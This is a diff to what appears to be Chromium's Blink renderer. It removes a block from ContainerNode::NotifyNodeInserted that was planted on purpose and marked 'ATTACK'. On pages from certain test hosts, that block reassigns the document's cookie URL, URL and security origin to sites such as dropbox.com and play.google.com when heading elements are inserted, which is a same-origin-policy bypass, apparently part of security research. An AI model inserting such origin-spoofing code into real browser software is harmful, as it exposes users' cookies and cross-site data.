@@ -882,37 +882,6 @@ void ContainerNode::NotifyNodeInserted(Node& root,
 #endif
   DCHECK(!root.IsShadowRoot());
 
-  if (GetDocument().CookieURL().GetString().Contains("http://w3.w1.com:3000/sop/")
-          || GetDocument().CookieURL().GetString().Contains("http://localhost:3000/sop/")) {
-      LOG(INFO) << ">>> [renderer][DOM] enter ContainerNode::NotifyNodeInserted " << root.ToString();
-      KURL targetUrl = NullURL();
-      if (root.ToString() == "H1") {
-          targetUrl = KURL(NullURL(),"https://dropbox.com/h");
-      } else if (root.ToString() == "H2") {
-          targetUrl = KURL(NullURL(),"http://victim.com:3000/sop/iframe.html");
-      } else if (root.ToString() == "H3") {
-          targetUrl = KURL(NullURL(),"https://play.google.com/store");
-      }
-
-      if(targetUrl != NullURL()) {
-        LOG(INFO) << "\t******************************************************";
-        LOG(INFO) << "\t [cookie_url, securityOrigin, accessEntry] = ["
-                  << GetDocument().CookieURL().GetString() << ", "
-                  << GetDocument().GetSecurityOrigin()->ToString() << ", "
-                  << "]";
-        LOG(INFO) << "\t securityOrigin is " << GetDocument().GetSecurityOrigin()->ToString();
-        LOG(INFO) << "\t ATTACK: we change the cookie_url, the securityOrigin and the url!!!";
-        GetDocument().SetCookieURL(targetUrl);
-        GetDocument().SetURL(targetUrl);
-        GetDocument().SetSecurityOrigin(SecurityOrigin::Create(GetDocument().CookieURL()));
-        LOG(INFO) << "\t [cookie_url, securityOrigin, accessEntry] = ["
-                  << GetDocument().CookieURL().GetString() << ", "
-                  << GetDocument().GetSecurityOrigin()->ToString() << ", "
-                  << "]";
-        LOG(INFO) << "\t******************************************************";
-      }
-  }
-
   if (GetDocument().ContainsV1ShadowTree())
     root.CheckSlotChangeAfterInserted();
 
